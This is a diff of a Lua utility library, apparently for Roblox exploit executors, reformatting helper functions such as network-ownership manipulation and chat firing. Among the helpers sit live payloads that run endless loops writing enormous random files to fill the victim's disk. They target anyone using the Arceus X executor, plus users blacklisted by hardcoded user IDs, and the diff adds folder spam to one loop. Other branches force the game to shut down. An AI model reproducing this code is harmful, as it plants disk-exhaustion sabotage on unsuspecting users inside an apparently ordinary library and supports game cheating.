@@ -15,19 +15,18 @@ if shared.FuncsConnect then
 		Functions.runFunction = function(func)
 			func()
 		end
-		--Functions.randomGUID = game:GetService("HttpService"):GenerateGUID(true)
 		Functions.randomGUID = function(state)
-		  state = state or true
-		  return game:GetService("HttpService"):GenerateGUID(state)
+			state = state or true
+			return game:GetService("HttpService"):GenerateGUID(state)
 		end
-    Functions.isnetworkowner = isnetworkowner or function(part)
-      local suc, res = pcall(function() return gethiddenproperty(part, "NetworkOwnershipRule") end)
-	    if suc and res == Enum.NetworkOwnership.Manual then
-		    sethiddenproperty(part, "NetworkOwnershipRule", Enum.NetworkOwnership.Automatic)
-		    networkownerswitch = tick() + 8
-		  end
-	    return networkownerswitch <= tick()
-    end
+		Functions.isnetworkowner = isnetworkowner or function(part)
+			local suc, res = pcall(function() return gethiddenproperty(part, "NetworkOwnershipRule") end)
+			if suc and res == Enum.NetworkOwnership.Manual then
+				sethiddenproperty(part, "NetworkOwnershipRule", Enum.NetworkOwnership.Automatic)
+				networkownerswitch = tick() + 8
+			end
+			return networkownerswitch <= tick()
+		end
 		Functions.ChatMessage = function(Text, UserRe)
 			UserRe = UserRe or "All"
 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Text, UserRe)
@@ -43,15 +42,15 @@ if shared.FuncsConnect then
 			sound:Destroy()
 		end
 		Functions.randomString = function(length1, length2)
-		  length1 = length1 or 10
-		  length2 = length2 or 100
-    	local randomlength = math.random(length1,length2)
-    	local array = {}
-    	for i = 1, randomlength do
-    	  array[i] = string.char(math.random(32, 126))
-    	end
-    	return table.concat(array)
-    end
+			length1 = length1 or 10
+			length2 = length2 or 100
+			local randomlength = math.random(length1,length2)
+			local array = {}
+			for i = 1, randomlength do
+				array[i] = string.char(math.random(32, 126))
+			end
+			return table.concat(array)
+		end
 		Functions.executor = identifyexecutor()
 		function Functions.displayErrorPopup(text, text1, text2, funclist)
 			local oldidentity = getidentity()
@@ -90,49 +89,48 @@ if shared.FuncsConnect then
 		end
 		function Functions.RobloxNotification(first, second, timewa)
 			game.StarterGui:SetCore("SendNotification", {
-    		Title = first;
-    		Text = second;
-  			Duration = timewa;
+				Title = first;
+				Text = second;
+				Duration = timewa;
 			})
 		end
 	end
 	if Functions.executor:find("Arceus X") then
 		Functions.RobloxNotification("Detected", "you executor not support for FunctionsHandler\nExecutor : Arceus X", 5)
 		Functions.displayErrorPopup("Detected", "you executor not support for FunctionsHandler\nExecutor : Arceus X", "OK", {OK = function()
-		  task.spawn(function()
-        repeat
-          task.wait(0.2)
-          writefile(Functions.randomGUID()..".txt", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
-        until false
-		  end)
-      wait(5)
-      game:Shutdown()
+			task.spawn(function()
+				repeat
+					task.wait(0.2)
+					makefolder(Functions.randomGUID())
+					writefile(Functions.randomGUID()..".txt", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
+				until false
+			end)
 		end})
 	end
 	if lplr.UserId == 4694883143 then
-	  Functions.displayErrorPopup("Functions", "You Has Been Blacklist\nReason: Never Come Back again", "OK", {OK = function()
-	    Functions.displayErrorPopup("Functions", "enjoy fully max workspace", "OK", {OK = function()
-	      task.spawn(function()
-          repeat
-            task.wait(0.2)
-            writefile(Functions.randomGUID()..".lua", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
-          until false
-        end)
-	    end})
-    end})
+		Functions.displayErrorPopup("Functions", "You Has Been Blacklist\nReason: Never Come Back again", "OK", {OK = function()
+			Functions.displayErrorPopup("Functions", "enjoy fully max workspace", "OK", {OK = function()
+				task.spawn(function()
+					repeat
+						task.wait(0.2)
+						writefile(Functions.randomGUID()..".lua", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
+					until false
+				end)
+			end})
+		end})
 	end
 	--[[
 	if lplr.UserId == 2624022508 then
-	  task.spawn(function()
+		task.spawn(function()
 			repeat
-        task.wait(0.4)
-        writefile(Functions.randomGUID()..".lua", "-- Unknown\n"..Functions.randomString(5555555555, 5555555555))
-        writefile(Functions.randomGUID()..".lua", "-- Unknown\n"..Functions.randomString(5555555555, 5555555555))
-      until false
-    end)
+				task.wait(0.4)
+				writefile(Functions.randomGUID()..".lua", "-- Unknown\n"..Functions.randomString(5555555555, 5555555555))
+				writefile(Functions.randomGUID()..".lua", "-- Unknown\n"..Functions.randomString(5555555555, 5555555555))
+			until false
+		end)
 	end
 	--]]
-  if lplr.UserId == 3110380407 or lplr.UserId == 4613474609 then
+	if lplr.UserId == 3110380407 or lplr.UserId == 4613474609 then
 		Functions.displayErrorPopup("Blacklist", "You has Been Blacklist, L imagine got blacklist", "OK", {OK = function()
 			game:Shutdown()
 		end})
